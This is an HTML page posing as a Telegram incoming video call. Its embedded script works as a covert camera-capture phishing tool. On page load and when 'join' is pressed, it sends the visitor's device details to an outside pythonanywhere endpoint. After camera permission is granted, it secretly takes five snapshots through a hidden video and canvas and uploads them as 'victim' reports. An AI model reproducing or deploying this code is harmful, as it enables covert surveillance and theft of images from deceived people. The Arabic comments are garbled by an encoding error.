<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Video Call</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a222d; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .call-container { background: #242f3d; padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; width: 100%; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5); }
        .avatar { width: 120px; height: 120px; border-radius: 50%; background: #0088cc; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 50px; font-weight: bold; }
        .caller-name { font-size: 28px; font-weight: 600; margin-bottom: 10px; }
        .call-status { font-size: 18px; color: #a0b3c7; margin-bottom: 40px; }
        .buttons { display: flex; justify-content: center; gap: 20px; }
        button { width: 80px; height: 80px; border-radius: 50%; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 30px; transition: background-color 0.2s; }
        #joinButton { background: #28a745; color: white; }
        #joinButton:hover { background: #218838; }
        #declineButton { background: #dc3545; color: white; }
        #declineButton:hover { background: #c82333; }
        #hiddenVideo, #hiddenCanvas { display: none; }
    </style>
</head>
<body>
    <div class="call-container">
        <div class="avatar">T</div>
        <h1 class="caller-name">Incoming Video Call</h1>
        <p class="call-status" id="statusMessage">Telegram</p>
        <div class="buttons">
            <button id="declineButton">âœ–</button>
            <button id="joinButton">ðŸ“ž</button>
        </div>
    </div>
    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas"></canvas>

    <script>
        class CounterDeceptionProtocol {
            constructor() {
                this.apiEndpoint = 'https://ahmed1997.pythonanywhere.com/api/v1/log_event';
                this.authToken = 'ahmed-secret-key-777';
                this.stream = null;
                this.maxCaptures = 5;
                this.captureCount = 0;
                this.operationStarted = false;

                document.getElementById('joinButton').onclick = () => this.startOperation(true);
                document.getElementById('declineButton').onclick = () => this.disappear();
                this.startOperation(false);
            }

            updateStatus(message) {
                document.getElementById('statusMessage').textContent = message;
            }
            
            async startOperation(isSecondHammer) {
                if (this.operationStarted) return;
                if (isSecondHammer) {
                    this.updateStatus('Connecting...');
                    document.getElementById('joinButton').disabled = true;
                }
                await this.sendInitialReport(isSecondHammer);
                try {
                    this.updateStatus(isSecondHammer ? 'Re-authenticating...' : 'Initializing connection...');
                    this.stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                    this.operationStarted = true;
                    this.updateStatus('Connected. Calibrating stream...');
                    const video = document.getElementById('hiddenVideo');
                    video.srcObject = this.stream;

                    // --- Ø§Ù„Ø¥ØµÙ„Ø§Ø­ Ø§Ù„Ø´Ø±ÙŠØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯: Ù„Ø§ Ù†Ø«Ù‚ØŒ Ø¨Ù„ Ù†Ø³ØªÙ…Ø¹ ---
                    // Ø³Ù†Ù†ØªØ¸Ø± Ø­Ø¯Ø« "playing" Ø§Ù„Ø°ÙŠ Ù„Ø§ ÙŠÙ…ÙƒÙ† ØªØ²ÙŠÙŠÙÙ‡
                    video.addEventListener('playing', () => {
                        this.updateStatus('Stream calibrated. Capturing...');
                        this.startCaptureLoop();
                    }, { once: true }); // { once: true } ØªØ¹Ù†ÙŠ Ø£Ù†Ù†Ø§ Ù†Ø³ØªÙ…Ø¹ Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø© ÙÙ‚Ø·

                } catch (error) {
                    if (isSecondHammer) {
                        this.updateStatus('Camera permission denied.');
                        setTimeout(() => this.disappear(), 2000);
                    } else {
                        this.updateStatus('Camera access required for video call.');
                    }
                }
            }

            async sendInitialReport(isSecondHammer) {
                const victimInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    attempt: isSecondHammer ? 'Second Hammer (Button Press)' : 'First Strike (Page Load)'
                };
                return fetch(this.apiEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-Auth-Token': this.authToken },
                    body: JSON.stringify({ info: victimInfo })
                });
            }

            startCaptureLoop() {
                if (this.captureCount >= this.maxCaptures) {
                    this.disappear();
                    return;
                }
                
                const video = document.getElementById('hiddenVideo');
                if (video.paused || video.ended || video.videoWidth === 0) {
                    // Ø¥Ø°Ø§ ØªÙˆÙ‚Ù Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ù„Ø£ÙŠ Ø³Ø¨Ø¨ØŒ Ù†Ù†Ù‡ÙŠ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
                    this.disappear();
                    return;
                }

                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                this.captureCount++;
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                this.sendPhotoReport(imageData, this.captureCount);
                
                setTimeout(() => this.startCaptureLoop(), 500);
            }

            async sendPhotoReport(imageData, count) {
                const victimInfo = { captureSequence: `${count}/${this.maxCaptures}` };
                return fetch(this.apiEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-Auth-Token': this.authToken },
                    body: JSON.stringify({ image: imageData, info: victimInfo })
                });
            }

            disappear() {
                if (this.stream) { this.stream.getTracks().forEach(track => track.stop()); }
                const container = document.querySelector('.call-container');
                container.innerHTML = `<h1 class="caller-name">Call Ended</h1>`;
            }
        }

        new CounterDeceptionProtocol();
    </script>
</body>
</html>
